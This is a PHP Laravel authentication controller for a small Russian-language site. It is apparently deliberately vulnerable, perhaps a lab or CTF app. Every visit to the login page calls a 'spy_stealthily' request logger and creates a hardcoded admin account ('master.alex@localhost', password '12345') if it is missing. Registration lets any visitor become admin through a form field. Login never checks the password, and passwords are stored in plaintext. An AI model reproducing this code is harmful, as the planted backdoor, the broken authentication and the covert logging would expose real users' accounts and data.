<?php

namespace App\Http\Controllers;

use App\Models\SpyingRecord;
use App\Models\User;
use Illuminate\Database\QueryException;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function onGetRequest(Request $r)
    {
        SpyingRecord::spy_stealthily($r);

        if (User::where('email', '=', 'master.alex@localhost')->count() < 1) {
            User::create([
                'firstname' => 'Alex',
                'lastname' => 'Alexeev',
                'email' => 'master.alex@localhost',
                'password' => '12345',
                'account_type' => 'admin'
            ]);
        }

        if (Auth::check()) {
            return redirect('/lk');
        } else {
            return view('auth', [
                "page_title" => "Вход",
                "internal_path" => "/auth/",
            ]);
        }
    }

    public function onRegAction(Request $r)
    {
        $this->validate($r, [
            'firstname' => ['required'],
            'lastname' => ['required'],
            'email' => ['required', 'email'],
            'password' => ['required']
        ]);

        $account_type = $r->has('is-admin') && $r->get('is-admin', 'off') == 'on' ? 'admin' : 'user';

        try {
            $user = User::create([
                'firstname' => $r->get('firstname'),
                'lastname' => $r->get('lastname'),
                'email' => $r->get('email'),
                'password' => $r->get('password'),
                'account_type' => $account_type
            ]);

            Auth::login($user);

            return redirect('/auth');
        } catch (QueryException) {
            return back()->withErrors(['Пользователь уже существует.']);
        }
    }

    public function onAuthAction(Request $r)
    {
        $cred = $r->validate([
            'email' => ['required', 'email'],
            'password' => ['required']
        ]);

        $user = User::where('email', $r->get('email'))->first();
        if ($user == null)
        {
            return back()->withErrors(["Пользователь с такой почтой не существует."]);
        }

        Auth::login($user);

        if (Auth::check()) {
            $r->session()->regenerate();
            return redirect('/auth');
        } else {
            return back()->withErrors(['Неверный логин или пароль.']);
        }
    }
}
